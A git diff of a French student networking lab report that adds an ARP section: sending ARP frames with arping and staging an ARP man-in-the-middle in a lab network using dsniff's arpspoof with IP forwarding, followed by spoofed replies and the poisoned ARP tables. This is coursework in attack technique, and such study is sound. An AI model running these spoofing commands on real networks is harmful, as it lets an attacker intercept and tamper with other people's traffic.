@@ -169,7 +169,7 @@
 
 ## 🌞 Wireshark it !
 
-### La capture est sous le nom : dchptp2.pcapng
+La capture est sous le nom : dchptp2.pcapng
 
 # III - ARP
 
@@ -182,10 +182,57 @@
 
 ## 🌞 Capturez l'échange ARP avec Wireshark
 
-### La capture est sous le nom : arp.pcapng
+La capture est sous le nom : arp.pcapng
 
 ## 🌞 Envoyer une trame ARP arbitraire
 
+    debian@debian:~$ sudo apt install arping
+#
+    debian@debian:~$ sudo arping 10.2.1.10
+    ARPING 10.2.1.10
+    58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=0 time=7.364 msec
+    58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=1 time=20.459 msec
+    58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=2 time=27.459 msec
+    58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=3 time=53.700 msec
+    58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=4 time=7.344 msec
+    58 bytes from 00:50:79:66:68:00 (10.2.1.10): index=5 time=17.578 msec
+    ^C
+    --- 10.2.1.10 statistics ---
+    3 packets transmitted, 6 packets received,   0% unanswered (3 extra)
+    rtt min/avg/max/std-dev = 7.344/22.317/53.700/15.732 ms
+#
+    PC1> show arp
 
+    0c:e6:03:92:00:00  10.2.1.11 expires in 79 seconds
 
+## 🌞 Mettre en place un ARP MITM
+
+    debian@debian:~$ sudo apt install dsniff
+#
+    debian@debian:~$ sudo sysctl -w net.ipv4.ip_forward=1
+#
+    debian@debian:~$ sudo arpspoof -i ens4 -r -t 10.2.1.10 10.2.1.254
+    c:e6:3:92:0:0 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at c:e6:3:92:0:0
+    c:e6:3:92:0:0 c:a:72:0:0:1 0806 42: arp reply 10.2.1.10 is-at c:e6:3:92:0:0
+    c:e6:3:92:0:0 0:50:79:66:68:0 0806 42: arp reply 10.2.1.254 is-at c:e6:3:92:0:0
+    c:e6:3:92:0:0 c:a:72:0:0:1 0806 42: arp reply 10.2.1.10 is-at c:e6:3:92:0:0
+    
+### Table ARP de node1.tp2.efrei :
+
+    PC1> show arp
+
+    0c:e6:03:92:00:00  10.2.1.11 expires in 28 seconds
+    0c:e6:03:92:00:00  10.2.1.254 expires in 120 seconds
+    
+### Table ARP de router.tp2.efrei :
+
+    [rocky@routeurtp2 ~]$ ip neighbor show
+    10.2.1.11 dev eth1 lladdr 0c:e6:03:92:00:00 STALE
+    192.168.122.1 dev eth0 lladdr 52:54:00:23:04:c2 STALE
+    10.2.1.253 dev eth1 lladdr 0c:f8:d7:6a:00:00 STALE
+    10.2.1.10 dev eth1 lladdr 0c:e6:03:92:00:00 REACHABLE
+    
+## 🌞 Capture Wireshark arp_mitm.pcap
+
+La capture est sous le nom : arpspooftp2.pcap
 
